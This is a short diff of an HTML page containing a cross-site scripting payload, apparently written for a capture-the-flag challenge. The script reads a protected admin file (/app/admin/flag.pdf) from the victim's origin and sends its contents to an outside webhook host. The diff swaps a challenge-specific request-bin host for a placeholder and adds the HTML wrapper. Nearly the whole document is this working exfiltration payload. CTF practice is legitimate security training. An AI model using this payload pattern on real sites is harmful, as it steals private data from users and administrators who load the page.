@@ -1,7 +1,12 @@
+<!DOCTYPE html>
+<html>
+<body>
 <script>
-fetch("http://localhost:1337/app/admin/flag.pdf")
+fetch("/app/admin/flag.pdf")
   .then(r => r.text())
   .then(flag => {
-    fetch("https://bcbbeeo.request.dreamhack.games/?flag=" + encodeURIComponent(flag));
+    fetch("https://webhook.request.url/?flag=" + encodeURIComponent(flag));
   });
 </script>
+</body>
+</html>
